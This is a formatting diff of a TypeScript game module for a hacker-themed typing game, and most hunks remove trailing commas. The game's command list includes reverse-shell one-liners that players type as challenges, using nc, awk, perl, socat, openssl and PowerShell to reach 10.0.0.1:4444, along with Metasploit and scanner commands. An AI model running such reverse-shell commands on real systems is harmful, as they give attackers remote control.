@@ -11,7 +11,7 @@ import type {
 	HackRunDifficulty,
 	NodeType,
 	NodeReward,
-	NodeProgress,
+	NodeProgress
 } from '$lib/core/types/hackrun';
 import type { TypingChallenge } from '$lib/core/types';
 import { NODE_TYPE_CONFIG } from '$lib/core/types/hackrun';
@@ -36,22 +36,22 @@ export const RUN_CONFIG: Record<
 		baseMultiplier: 1.5,
 		timeLimit: 5 * 60 * 1000,
 		shortcuts: 0,
-		nodeCount: 5,
+		nodeCount: 5
 	},
 	medium: {
 		entryFee: 100n * 10n ** 18n,
 		baseMultiplier: 2.0,
 		timeLimit: 4 * 60 * 1000,
 		shortcuts: 1,
-		nodeCount: 5,
+		nodeCount: 5
 	},
 	hard: {
 		entryFee: 200n * 10n ** 18n,
 		baseMultiplier: 3.0,
 		timeLimit: 3 * 60 * 1000,
 		shortcuts: 2,
-		nodeCount: 5,
-	},
+		nodeCount: 5
+	}
 };
 
 /** Multiplier duration in milliseconds (4 hours) */
@@ -78,7 +78,7 @@ const COMMANDS: Record<'easy' | 'medium' | 'hard', string[]> = {
 		'top -n 1',
 		'netstat -an',
 		'uname -a',
-		'ifconfig eth0',
+		'ifconfig eth0'
 	],
 	medium: [
 		'ssh root@192.168.1.1',
@@ -95,7 +95,7 @@ const COMMANDS: Record<'easy' | 'medium' | 'hard', string[]> = {
 		'msfconsole -x "use exploit"',
 		'nikto -h https://target.com',
 		'gobuster dir -u http://target',
-		'wpscan --url http://target',
+		'wpscan --url http://target'
 	],
 	hard: [
 		'python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
@@ -105,10 +105,10 @@ const COMMANDS: Record<'easy' | 'medium' | 'hard', string[]> = {
 		'echo "* * * * * /bin/nc -e /bin/sh 10.0.0.1 4444"',
 		'awk \'BEGIN{s="/inet/tcp/0/10.0.0.1/4444";while(1)}\'',
 		'perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket()\'',
-		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane",
+		'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane',
 		'openssl s_client -quiet -connect 10.0.0.1:443|/bin/sh',
-		'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient"',
-	],
+		'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient"'
+	]
 };
 
 /** Node names by type */
@@ -119,7 +119,7 @@ const NODE_NAMES: Record<NodeType, string[]> = {
 	trap: ['ALERT_ZONE', 'TRIPWIRE_7', 'SNARE_NODE', 'BAIT_CACHE', 'DANGER_SECTOR'],
 	ice_wall: ['ICE_BARRIER', 'FROST_GATE', 'CRYO_WALL', 'FREEZE_SEC', 'COLD_LOGIC'],
 	honeypot: ['REWARD_NODE', 'PRIZE_CACHE', 'LOOT_BOX', 'GOLD_MINE', 'JACKPOT_X'],
-	backdoor: ['BACKDOOR_7G', 'SECRET_PATH', 'BYPASS_NODE', 'SHORTCUT_X', 'HIDDEN_GATE'],
+	backdoor: ['BACKDOOR_7G', 'SECRET_PATH', 'BYPASS_NODE', 'SHORTCUT_X', 'HIDDEN_GATE']
 };
 
 /** Node descriptions by type */
@@ -127,38 +127,38 @@ const NODE_DESCRIPTIONS: Record<NodeType, string[]> = {
 	firewall: [
 		'Standard perimeter defense. Bypass with precision.',
 		'Corporate firewall detected. Moderate encryption.',
-		'Security checkpoint. Stay focused.',
+		'Security checkpoint. Stay focused.'
 	],
 	patrol: [
 		'Automated security sweep. Easy pickings.',
 		'Low-priority scan routine. Quick bypass.',
-		'Basic patrol algorithm. Should be simple.',
+		'Basic patrol algorithm. Should be simple.'
 	],
 	data_cache: [
 		'Encrypted data store. High value target.',
 		'Sensitive files detected. Worth the risk.',
-		'Corporate secrets ahead. Big rewards.',
+		'Corporate secrets ahead. Big rewards.'
 	],
 	trap: [
 		'WARNING: Anomalous activity detected.',
 		'CAUTION: Pattern suggests countermeasure.',
-		'ALERT: Possible honeypot configuration.',
+		'ALERT: Possible honeypot configuration.'
 	],
 	ice_wall: [
 		'Intrusion Countermeasures Electronics. Hard target.',
 		'Advanced ICE detected. Requires skill.',
-		'Military-grade protection. Proceed carefully.',
+		'Military-grade protection. Proceed carefully.'
 	],
 	honeypot: [
 		'Unusual access pattern. Could be bait.',
 		'Too easy? Trust your instincts.',
-		'Suspicious configuration. Risk vs reward.',
+		'Suspicious configuration. Risk vs reward.'
 	],
 	backdoor: [
 		'Developer access point. Skip ahead.',
 		'Legacy vulnerability. Risky shortcut.',
-		'Maintenance tunnel. Fast but dangerous.',
-	],
+		'Maintenance tunnel. Fast but dangerous.'
+	]
 };
 
 // ════════════════════════════════════════════════════════════════
@@ -217,7 +217,7 @@ export function generateTypingChallenge(
 	return {
 		command,
 		difficulty: effectiveDifficulty,
-		timeLimit,
+		timeLimit
 	};
 }
 
@@ -266,7 +266,7 @@ export function generateNode(
 		'data_cache',
 		'trap',
 		'ice_wall',
-		'honeypot',
+		'honeypot'
 	];
 
 	const weights = types.map((type) => {
@@ -300,7 +300,7 @@ export function generateNode(
 		challenge: generateTypingChallenge(nodeType, difficulty),
 		reward: generateNodeReward(nodeType, difficulty),
 		risk: config.risk,
-		hidden: position > 1, // First node always visible
+		hidden: position > 1 // First node always visible
 	};
 }
 
@@ -318,7 +318,7 @@ function generateBackdoorNode(position: number, skipTo: number): HackRunNode {
 		reward: { type: 'skip', value: skipTo - position, label: `SKIP TO NODE ${skipTo}` },
 		risk: 'medium',
 		hidden: true,
-		alternativePaths: [], // Will be filled with target node ID
+		alternativePaths: [] // Will be filled with target node ID
 	};
 }
 
@@ -360,7 +360,7 @@ export function generateRun(difficulty: HackRunDifficulty): HackRun {
 		nodes,
 		baseMultiplier: config.baseMultiplier,
 		timeLimit: config.timeLimit,
-		shortcuts: config.shortcuts,
+		shortcuts: config.shortcuts
 	};
 }
 
@@ -376,13 +376,11 @@ export function generateAvailableRuns(): HackRun[] {
  */
 export function initializeProgress(run: HackRun): NodeProgress[] {
 	// Only track main path nodes (not backdoors)
-	const mainNodes = run.nodes
-		.filter((n) => n.type !== 'backdoor')
-		.sort((a, b) => a.position - b.position);
+	const mainNodes = run.nodes.filter((n) => n.type !== 'backdoor').sort((a, b) => a.position - b.position);
 
 	return mainNodes.map((node, index) => ({
 		nodeId: node.id,
-		status: index === 0 ? 'current' : 'pending',
+		status: index === 0 ? 'current' : 'pending'
 	}));
 }
 
@@ -394,7 +392,7 @@ export function initializeProgress(run: HackRun): NodeProgress[] {
 const BASE_XP: Record<HackRunDifficulty, number> = {
 	easy: 50,
 	medium: 100,
-	hard: 200,
+	hard: 200
 };
 
 /** XP bonus per completed node */
